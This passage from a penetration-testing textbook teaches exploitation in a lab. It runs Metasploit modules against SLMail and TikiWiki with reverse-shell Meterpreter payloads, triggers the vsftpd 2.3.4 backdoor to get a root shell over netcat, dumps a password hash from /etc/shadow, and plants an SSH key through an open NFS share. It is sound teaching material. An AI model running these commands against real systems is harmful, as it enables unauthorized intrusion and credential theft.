Windows XP target is vulnerable to the POP3 issue CVE-2003-0264. The
version number reported by SLMail (5.5) appears to line up with the vul-
nerability, so let’s try exploiting it. The corresponding Metasploit module,
windows/pop3/seattlelab_pass, has a rank of great. (A ranking that high is
unlikely to crash the service if it fails.)
Windows/pop3/seattlelab_pass attempts to exploit a buffer overflow in the
POP3 server. Using it is similar to setting up the MS08-067 exploit, as shown
in Listing 8-5.
msf > use windows/pop3/seattlelab_pass
msf exploit(seattlelab_pass) > show payloads
Compatible Payloads
===================
Name Disclosure Date Rank Description
---- --------------- ---- -----------
generic/custom normal Custom Payload
generic/debug_trap normal Generic x86 Debug Trap
--snip--
msf exploit(seattlelab_pass) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(seattlelab_pass) > show options
Module options (exploit/windows/pop3/seattlelab_pass):
Name Current Setting Required Description
---- --------------- -------- -----------
RHOST 192.168.20.10 yes The target address
RPORT 110 yes The target port
Payload options (windows/meterpreter/reverse_tcp):
Name Current Setting Required Description
---- --------------- -------- -----------
EXITFUNC thread yes Exit technique: seh, thread, process, none
LHOST yes The listen address
LPORT 4444 yes The listen port
Exploit target:
Id Name
-- ----
0 Windows NT/2000/XP/2003 (SLMail 5.5)
msf exploit(seattlelab_pass) > set RHOST 192.168.20.10
RHOST => 192.168.20.10
190 Chapter 8
msf exploit(seattlelab_pass) > set LHOST 192.168.20.9
LHOST => 192.168.20.9
msf exploit(seattlelab_pass) > exploit
[*] Started reverse handler on 192.168.20.9:4444
[*] Trying Windows NT/2000/XP/2003 (SLMail 5.5) using jmp esp at 5f4a358f
[*] Sending stage (752128 bytes) to 192.168.20.10
[*] Meterpreter session 4 opened (192.168.20.9:4444 -> 192.168.20.10:1566) at 2015-01-07
19:57:22 -0500
meterpreter >
Listing 8-5: Exploiting SLMail 5.5 POP3 with Metasploit
Running this exploit should give us another Meterpreter session on
the Windows XP target—yet another way to take control of the system.
(In Chapter 13, which covers post exploitation, we’ll see what to do once
we have a Meterpreter session on a target.)
exploiting third-Party web applications
In Chapter 6, we used the Nikto web scanner against our Linux target and
discovered an installation of the TikiWiki CMS software version 1.9.8 with
a code execution vulnerability in the script graph_formula.php. A search for
TikiWiki in Metasploit returns several modules, as shown in Listing 8-6.
msf exploit(seattlelab_pass) > search tikiwiki
Matching Modules
================
Name Disclosure Date Rank Description
---- --------------- ---- -----------
--snip--
uexploit/unix/webapp/tikiwiki_graph_formula_exec 2007-10-10 00:00:00 UTC excellent TikiWiki graph_
formula Remote
PHP Code
Execution
exploit/unix/webapp/tikiwiki_jhot_exec 2006-09-02 00:00:00 UTC excellent TikiWiki jhot
Remote Command
Execution
--snip--
msf exploit(seattlelab_pass) > info unix/webapp/tikiwiki_graph_formula_exec
Name: TikiWiki tiki-graph_formula Remote PHP Code Execution
Module: exploit/unix/webapp/tikiwiki_graph_formula_exec
--snip--
TikiWiki ( use unix/webapp/tikiwiki_graph_formula_exec
msf exploit(tikiwiki_graph_formula_exec) > show options
Module options (exploit/unix/webapp/tikiwiki_graph_formula_exec):
Name Current Setting Required Description
---- --------------- -------- -----------
Proxies no Use a proxy chainu
RHOST yes The target address
RPORT 80 yes The target port
URI /tikiwiki yes TikiWiki directory pathv
VHOST no HTTP server virtual hostw
Exploit target:
Id Name
-- ----
0 Automatic
msf exploit(tikiwiki_graph_formula_exec) > set RHOST 192.168.20.11
RHOST => 192.168.20.11
Listing 8-7: Using the TikiWiki exploit
We could set a proxy chain u and/or a virtual host w for the TikiWiki
server, but we don’t need to here. We can leave the URI set to the default
location /tikiwiki v.
This exploit involves PHP command execution, so naturally, our
payloads are PHP based. Using the show payloads command (Listing 8-8)
reveals that we can use PHP-based Meterpreter u as we did in our XAMPP
exploit. We will also need to set our LHOST option v again.
192 Chapter 8
msf exploit(tikiwiki_graph_formula_exec) > set payload php/meterpreter/reverse_tcpu
payload => php/meterpreter/reverse_tcp
msf exploit(tikiwiki_graph_formula_exec) > set LHOST 192.168.20.9v
LHOST => 192.168.20.110
msf exploit(tikiwiki_graph_formula_exec) > exploit
[*] Started reverse handler on 192.168.20.9:4444
[*] Attempting to obtain database credentials...
[*] The server returned : 200 OK
[*] Server version : Apache/2.2.9 (Ubuntu) PHP/5.2.6-2ubuntu4.6 with Suhosin-Patch
[*] TikiWiki database informations :
db_tiki : mysql
dbversion : 1.9
host_tiki : localhost
user_tiki : tikiw
pass_tiki : tikipassword
dbs_tiki : tikiwiki
[*] Attempting to execute our payload...
[*] Sending stage (39217 bytes) to 192.168.20.11
[*] Meterpreter session 5 opened (192.168.20.9:4444 -> 192.168.20.11:54324) at 2015-01-07
20:41:53 -0500
meterpreter >
Listing 8-8: Exploiting TikiWiki with Metasploit
As you can see, while exploiting the TikiWiki installation, the Meta-
sploit module discovered the credentials w for the TikiWiki database.
Unfortunately, the MySQL server is not listening on the network, so these
credentials cannot be used for additional compromise. Still, we should note
them because they might come in handy during post exploitation.
exploiting a Compromised service
We noted in Chapter 6 that the FTP server on the Linux target serves a ban-
ner for Very Secure FTP 2.3.4, the version replaced with a binary containing
a backdoor. Because the official code was eventually restored by the authors
of Vsftpd, the only way to find out if the server on our Linux target has the
backdoor code is to test it. (We don’t need to worry about potentially crash-
ing the service if it’s not vulnerable: If this server doesn’t have the backdoor
code, we’ll just get a login error when we use the smiley face.)
Enter any username you like, and add a :) at the end (see Listing 8-9).
Use anything for the password, as well. If the backdoor is present, it will
trigger without valid credentials.
root@kali:~# ftp 192.168.20.11
Connected to 192.168.20.11.
220 (vsFTPd 2.3.4)
Exploitation 193
Name (192.168.20.11:root): georgia:)
331 Please specify the password.
Password:
Listing 8-9: Triggering the Vsftpd backdoor
We notice that the login hangs after the password. This tells us that the
FTP server is still processing our login attempt, and if we query the FTP
port again, it will continue to respond. Let’s use Netcat to try connecting
to port 6200, where the root shell should spawn if the backdoor is present.
root@kali:~# nc 192.168.20.11 6200
# whoami
root
Sure enough, we have a root shell. Root privileges give us total control of
our target machine. For example, we can get the system password hashes with
the command cat /etc/shadow. Save the password hash for the user georgia
(georgia:$1$CNp3mty6$|RWcT0/PVYpDKwyaWWkSg/:15640:0:99999:7:::)to a
file called linuxpasswords.txt. We will attempt to turn this hash into a plain-
text password in Chapter 9.
exploiting open nFs shares
At this point we know that the Linux target has exported user georgia’s
home folder using NFS and that that share is available to anyone without
the need for credentials. But this might not carry much security risk if we
cannot use the access to read or write sensitive files.
Recall that when we scanned the NFS mount in Chapter 6, we saw the
.ssh directory. This directory could contain the user’s private SSH keys as
well as keys used for authenticating a user over SSH. Let’s see if we can
exploit this share. Start by mounting the NFS share on your Kali system.
root@kali:~# mkdir /tmp/mount
root@kali:~# mount -t nfs -o nolock 192.168.20.11:/export/georgia /tmp/mount
This doesn’t look too promising at first glance because georgia has no
documents, pictures, or videos—just some simple buffer overflow examples
we will use in Chapter 16. There doesn’t appear to be any sensitive infor-
mation here, but before we jump to conclusions, let’s see what’s in the .ssh
directory.
root@kali:~# cd /tmp/mount/.ssh
root@kali:/tmp/mount/.ssh# ls
authorized_keys id_rsa id_rsa.pub
We now have access to georgia’s SSH keys. The id_rsa file is her private
key, and id_rsa.pub is her corresponding public key. We can read or even
change these values, and we can write to the SSH file authorized_keys, which
194 Chapter 8
handles a list of SSH public keys that are authorized to log in as the user
georgia. And because we have write privileges, we can add our own key here
that will allow us to bypass password authentication when logging in to the
Ubuntu target as georgia, as shown in Listing 8-10.
root@kali:~# ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa):
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /root/.ssh/id_rsa.
Your public key has been saved in /root/.ssh/id_rsa.pub.
The key fingerprint is:
26:c9:b7:94:8e:3e:d5:04:83:48:91:d9:80:ec:3f:39 root@kali
The key's randomart image is:
+--[ RSA 2048]----+
| . o+B . |
--snip--
+-----------------+
Listing 8-10: Generating a new SSH key pair
First, we generate a key on our Kali machine using ssh-keygen. By
default our new public key is written to /root/.ssh/id_rsa.pub, and our pri-
vate key is written to /root/.ssh/id_rsa. We want to add our public key to the
authorized_keys file for georgia on Ubuntu.
Next, let’s append the newly generated public key to georgia’s authorized_
keys file. cat out the contents of the /root/.ssh/id_rsa.pub file, and append it to
georgia’s authorized_keys file.
root@kali:~# cat ~/.ssh/id_rsa.pub >> /tmp/mount/.ssh/authorized_keys
We should now be able to SSH into the Linux target as georgia. Let’s
give it a try.
root@kali:~# ssh PI:EMAIL
georgia@ubuntu:~$
That worked nicely. We can now successfully authenticate with the
Linux target using public key authentication.
We could also have gained access by copying georgia’s key to the Kali
machine. To do so, we first delete the SSH identity we created.
root@kali:/tmp/mount/.ssh# rm ~/.ssh/id_rsa.pub
root@kali:/tmp/mount/.ssh# rm ~/.ssh/id_rsa
Now, we copy georgia’s private key (id_rsa) and public key (id_rsa.pub) to
root’s .ssh directory on Kali, and use the ssh-add command to add the iden-
tity to the authentication agent before we try to SSH into the Linux target.
Exploitation 195
root@kali:/tmp/mount/.ssh# cp id_rsa.pub ~/.ssh/id_rsa.pub
root@kali:/tmp/mount/.ssh# cp id_rsa ~/.ssh/id_rsa
root@kali:/tmp/mount/.ssh# ssh-add
Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)
root@kali:/tmp/mount/.ssh# ssh PI:EMAIL
Linux ubuntu 2.6.27-7-generic #1 SMP Fri Oct 24 06:42:44 UTC 2008 i686
georgia@ubuntu:~$
Again, we are able to gain access to the target by manipulating the SSH
keys. We started with the ability to read and write files in georgia’s home
directory. Now we have a shell on the Linux system as user georgia without
needing a password.
summary
In this chapter we were able to combine the information we gathered in
Chapter 5 with the vulnerabilities discovered in Chapter 6 to exploit mul-
tiple compromises on both the Windows XP and Linux targets. We used
various techniques, including attacking misconfigured web servers, piggy-
backing on backdoored software, taking advantage of poor access control
to sensitive files, exploiting vulnerabilities in the underlying system, and
exploiting issues in third-party software.
Now that we’ve managed to get a foothold in the systems, in the next
chapter, let’s turn to cracking the passwords we found on the systems.
196 Chapter 8
9
PassworD at taCks
Passwords are often the path of least resistance on
pentesting engagements. A client with a strong secu-
rity program can fix missing Windows patches and
out-of-date software, but the users themselves can’t be
patched. We’ll look at attacking users when we discuss
social engineering in Chapter 11, but if we can correctly guess or calculate
a user’s password, we may be able to avoid involving the user in the attack at
all. In this chapter we’ll look at how to use tools to automate running services
on our targets and sending usernames and passwords. Additionally, we’ll
study cracking the password hashes we gained access to in Chapter 8.
Password management
Companies are waking up to the inherent risks of password-based authen-
tication; brute-force attacks and educated guesses are both serious risks to
weak passwords. Many organizations use biometric (fingerprint or retinal
scan-based) or two-factor authentication to mitigate these risks. Even web
services such as Gmail and Dropbox offer two-factor authentication in
which the user provides a password as well as a second value, such as the
digits on an electronic token. If two-factor authentication is not available,